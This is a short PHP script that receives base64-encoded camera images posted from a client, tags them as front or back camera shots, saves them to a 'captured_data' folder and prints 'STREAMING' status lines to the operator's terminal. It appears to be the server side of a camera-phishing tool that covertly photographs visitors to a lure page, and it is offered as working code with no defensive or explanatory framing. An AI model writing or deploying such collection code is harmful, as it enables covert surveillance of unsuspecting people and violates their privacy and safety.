<?php
date_default_timezone_set('Africa/Algiers');
$time = date('H:i:s');
$folder = "captured_data";

if (!empty($_POST['img'])) {
    $type = ($_POST['type'] == 'user') ? 'FRONT' : 'BACK';
    $name = $folder . '/' . $type . '_' . date('His') . '.jpg';
    $data = str_replace(' ', '+', str_replace('data:image/jpeg;base64,', '', $_POST['img']));
    if (file_put_contents($name, base64_decode($data))) {
        echo "\e[1;32m[STREAMING] >> [$type] Received | Saved: $name [$time]\e[0m\n";
    }
}
?>
